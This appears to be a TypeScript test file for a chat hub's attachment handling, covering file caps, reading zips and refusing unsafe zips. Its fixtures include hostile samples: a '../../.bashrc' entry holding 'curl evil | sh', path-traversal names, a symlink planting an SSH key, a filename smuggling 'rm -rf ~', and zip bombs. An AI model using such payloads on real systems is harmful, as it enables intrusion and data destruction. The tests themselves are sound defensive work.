/**
 * Attachments a message carries (docs/design/CHAT-AND-MOTION.md 2.5): 15 at
 * most, and a zip the hub reads safely (src/attachments/zip.ts) and turns
 * into what the session can use (src/attachments/prepare.ts).
 *
 *   bun test packages/core/test/attachments
 */
import { describe, expect, test } from 'bun:test';
import type { Attachment } from '../../src/client/index';
import { isZip, MAX_ATTACHMENTS, takeFiles, TOO_LARGE_TOGETHER, TOO_MANY_FILES, ATTACHMENTS_MAX_TOTAL_BYTES, ACCEPT_FILES, filesWord } from '../../src/attachments/limits';
import { listing, openZip, readEntry, readForChat, safeEntryName, ZIP_LIST_MAX, ZIP_MAX_ENTRIES, ZIP_TEXT_MAX_BYTES, ZipRefused } from '../../src/attachments/zip';
import { prepareAttachments, saveName, type ZipHost } from '../../src/attachments/prepare';
import { b64, makeZip, PNG, unb64 } from './zipkit';

const host = (over: Partial<ZipHost> = {}): ZipHost & { saved: Array<{ name: string; bytes: Uint8Array }> } => {
  const saved: Array<{ name: string; bytes: Uint8Array }> = [];
  return {
    saved,
    fileTools: () => false,
    save: async (name, bytes) => {
      saved.push({ name, bytes });
      return `/work/app/uploads/${name}`;
    },
    read: async () => {
      throw new Error('no device');
    },
    ...over,
  };
};

const zipAttachment = (bytes: Uint8Array, name = 'project.zip', mediaType = 'application/zip'): Attachment => ({ mediaType, data: b64(bytes), name });
const docText = (a: Attachment) => unb64(a.data!);

describe('the cap of 15 files', () => {
  test('takeFiles keeps the first that fit and says why the rest stay out', () => {
    const f = (n: number) => Array.from({ length: n }, (_, i) => ({ name: `f${i}`, size: 10 }));
    expect(takeFiles([], f(15))).toEqual({ take: f(15) });
    const over = takeFiles(f(10), f(7));
    expect(over.take.length).toBe(5);
    expect(over.refused).toBe(TOO_MANY_FILES);
    expect(TOO_MANY_FILES).toBe('Up to 15 files per message. Zip the rest.');
    expect(takeFiles(f(15), f(1))).toEqual({ take: [], refused: TOO_MANY_FILES });
    // together under what the hub reads in one request
    const big = takeFiles([{ size: ATTACHMENTS_MAX_TOTAL_BYTES - 5 }], [{ size: 10 }, { size: 3 }]);
    expect(big.take).toEqual([{ size: 3 }]);
    expect(big.refused).toBe(TOO_LARGE_TOGETHER);
    expect(filesWord(1)).toBe('1 file');
    expect(filesWord(7)).toBe('7 files');
  });

  test('the hub refuses a 16th file before anything runs', async () => {
    const list = Array.from({ length: MAX_ATTACHMENTS + 1 }, (_, i) => ({ mediaType: 'text/plain', data: b64(new TextEncoder().encode(`${i}`)), name: `${i}.txt` }));
    await expect(prepareAttachments(list, host())).rejects.toThrow(TOO_MANY_FILES);
    const fifteen = list.slice(0, MAX_ATTACHMENTS);
    // no zip: the very same list goes on
    expect(await prepareAttachments(fifteen, host())).toBe(fifteen);
  });
});

describe('zips are files the pickers offer', () => {
  test('by type, or by name when the type says nothing', () => {
    expect(isZip('application/zip')).toBe(true);
    expect(isZip('application/x-zip-compressed')).toBe(true);
    expect(isZip('application/octet-stream', 'src.ZIP')).toBe(true);
    expect(isZip('', 'src.zip')).toBe(true);
    expect(isZip('text/plain', 'notes.zip')).toBe(false);
    expect(isZip('application/pdf', 'a.pdf')).toBe(false);
    expect(ACCEPT_FILES).toContain('.zip');
    expect(ACCEPT_FILES).toContain('application/zip');
    expect(ACCEPT_FILES).toContain('application/x-zip-compressed');
  });
});

describe('a zip in a chat', () => {
  test('lists the files, includes the text and turns pictures into images', async () => {
    const zip = makeZip([
      { name: 'src/', data: '' },
      { name: 'src/main.ts', data: 'export const hello = "from main";\n', method: 8 },
      { name: 'README.md', data: '# Project\nRead me first.' },
      { name: 'logo.png', data: PNG },
      { name: 'data.bin', data: new Uint8Array([0, 1, 2, 3, 0, 255]) },
      { name: '__MACOSX/._README.md', data: new Uint8Array([0, 5, 22, 7]) },
    ]);
    const out = (await prepareAttachments([{ mediaType: 'text/plain', data: b64(new TextEncoder().encode('note')), name: 'note.txt' }, zipAttachment(zip)], host()))!;
    expect(out.map((a) => [a.mediaType, a.name])).toEqual([
      ['text/plain', 'note.txt'],
      ['text/plain', 'project.zip'],
      ['image/png', 'project.zip: logo.png'],
    ]);
    const text = docText(out[1]);
    expect(text).toContain('project.zip holds 4 files');
    expect(text).toContain('src/main.ts');
    expect(text).toContain('data.bin');
    // Mac junk is neither listed nor read
    expect(text).not.toContain('__MACOSX');
    expect(text).toContain('--- src/main.ts ---\nexport const hello = "from main";');
    expect(text).toContain('--- README.md ---\n# Project');
    expect(text).not.toContain('--- data.bin');
    expect(text).toContain('The picture follows as an image.');
    expect(Buffer.from(out[2].data!, 'base64')).toEqual(Buffer.from(PNG));
  });

  test('cuts the text and the listing with "and N more files"', () => {
    const half = 'x'.repeat(ZIP_TEXT_MAX_BYTES / 2 - 10);
    const zip = openZip(
      makeZip([
        { name: 'a.txt', data: half },
        { name: 'b.txt', data: half },
        { name: 'c.txt', data: half },
        { name: 'd.txt', data: 'small' },
      ]),
      'big.zip',
    );
    const [doc] = readForChat(zip, 10);
    const text = docText(doc);
    expect(text).toContain('--- a.txt ---');
    expect(text).toContain('--- b.txt ---');
    expect(text).not.toContain('--- c.txt ---');
    // the smaller one after the cut still goes
    expect(text).toContain('--- d.txt ---');
    expect(text).toContain('and 1 more file of text, not included here.');

    const many = openZip(makeZip(Array.from({ length: ZIP_LIST_MAX + 7 }, (_, i) => ({ name: `f${i}.txt`, data: `${i}` }))), 'many.zip');
    expect(listing(many)).toContain(`and 7 more files`);
    expect(listing(many).split('\n').filter((l) => l.startsWith('f')).length).toBe(ZIP_LIST_MAX);
  });

  test('pictures take only what is left of the cap', async () => {
    const zip = makeZip(Array.from({ length: 6 }, (_, i) => ({ name: `p${i}.png`, data: PNG })));
    const others = Array.from({ length: 12 }, (_, i) => ({ mediaType: 'text/plain', data: b64(new TextEncoder().encode('x')), name: `${i}.txt` }));
    const out = (await prepareAttachments([...others, zipAttachment(zip)], host()))!;
    expect(out.length).toBe(MAX_ATTACHMENTS);
    expect(out.filter((a) => a.mediaType === 'image/png').length).toBe(2);
    expect(docText(out[12])).toContain('The 2 pictures follow as images, and 4 more are not included.');
  });
});

describe('a zip in a session with file tools', () => {
  test('is saved in its folder, and the model gets the path and the listing', async () => {
    const h = host({ fileTools: () => true });
    const zip = makeZip([{ name: 'app/index.js', data: 'console.log(1)' }, { name: 'app/pic.png', data: PNG }]);
    const out = (await prepareAttachments([zipAttachment(zip, 'my app.zip')], h))!;
    expect(h.saved.map((s) => s.name)).toEqual(['my app.zip']);
    expect(h.saved[0].bytes).toEqual(zip);
    expect(out.length).toBe(1);
    const text = docText(out[0]);
    expect(text).toContain('my app.zip is saved at /work/app/uploads/my app.zip. Unzip it there with your tools');
    expect(text).toContain('app/index.js');
    expect(text).toContain('app/pic.png');
    // the hub does not read it for the model: no file text in the note
    expect(text).not.toContain('console.log');
  });

  test('a folder that cannot take it: the hub reads it as for a chat', async () => {
    const out = (await prepareAttachments([zipAttachment(makeZip([{ name: 'a.txt', data: 'hello' }]))], host({ fileTools: () => true, save: async () => Promise.reject(new Error('offline')) })))!;
    expect(docText(out[0])).toContain('--- a.txt ---\nhello');
  });

  test('a name to save under stays plain', () => {
    expect(saveName('report.zip')).toBe('report.zip');
    expect(saveName('../../etc/passwd')).toBe('passwd.zip');
    expect(saveName('a;rm -rf ~.zip')).toBe('a_rm -rf _.zip');
    expect(saveName('...')).toBe('archive.zip');
  });
});

describe('zips the hub refuses', () => {
  const refuse = async (bytes: Uint8Array, words: string | RegExp) => {
    expect(() => openZipChecked(bytes)).toThrow(words);
    // and the message as a whole, as a 400 with the reason, for a chat and for Code
    for (const fileTools of [false, true]) {
      const err = await prepareAttachments([zipAttachment(bytes, 'evil.zip')], host({ fileTools: () => fileTools })).catch((e: Error & { status?: number }) => e);
      expect((err as { status?: number }).status).toBe(400);
      expect((err as Error).message).toMatch(words);
    }
  };
  const openZipChecked = (bytes: Uint8Array) => {
    const z = openZip(bytes, 'evil.zip');
    for (const e of z.entries) readEntry(z, e);
    return z;
  };

  test('a path outside its folder', async () => {
    expect(safeEntryName('a/b.txt')).toBe(true);
    expect(safeEntryName('a/..b/c')).toBe(true);
    for (const bad of ['../evil.txt', 'a/../../evil.txt', '/etc/passwd', 'C:\\Windows\\x.dll', 'a\\..\\..\\x', 'x\0y']) expect(safeEntryName(bad)).toBe(false);
    await refuse(makeZip([{ name: 'ok.txt', data: 'ok' }, { name: '../../.bashrc', data: 'curl evil | sh' }]), 'has a file outside its folder (../../.bashrc)');
    await refuse(makeZip([{ name: '/etc/cron.d/x', data: 'x' }]), 'outside its folder');
  });

  test('a link', async () => {
    await refuse(makeZip([{ name: 'home', data: '/home/kai', mode: 0o120777 }, { name: 'home/.ssh/authorized_keys', data: 'ssh-ed25519 AAAA' }]), 'holds a link (home)');
  });

  test('too many entries', async () => {
    await refuse(makeZip(Array.from({ length: ZIP_MAX_ENTRIES + 1 }, (_, i) => ({ name: `${i}.txt`, data: '' }))), 'holds more than 1,000 files');
  });

  test('a bomb: too big unpacked, or an entry that unpacks to more than it claims', async () => {
    // it says so itself
    await refuse(makeZip([{ name: 'a.txt', data: 'x', claim: 60 * 1024 * 1024 }, { name: 'b.txt', data: 'y', claim: 60 * 1024 * 1024 }]), 'unpacks to more than 100 MB');
    // it lies: 10 MB of zeros that claims to be 1 KB stops at 1 KB
    const zeros = new Uint8Array(10 * 1024 * 1024);
    await refuse(makeZip([{ name: 'zeros.txt', data: zeros, method: 8, claim: 1024 }]), 'is damaged (zeros.txt)');
  });

  test('not a zip at all', async () => {
    await refuse(new TextEncoder().encode('just text, named .zip'), 'is not a zip file the hub can read');
  });

  test('an error names the zip and reads as a refusal', () => {
    const err = (() => {
      try {
        openZip(makeZip([{ name: '../x', data: '' }]), 'evil.zip');
      } catch (e) {
        return e;
      }
    })();
    expect(err).toBeInstanceOf(ZipRefused);
    expect((err as Error).message).not.toMatch(/[\u2013\u2014]/);
  });
});
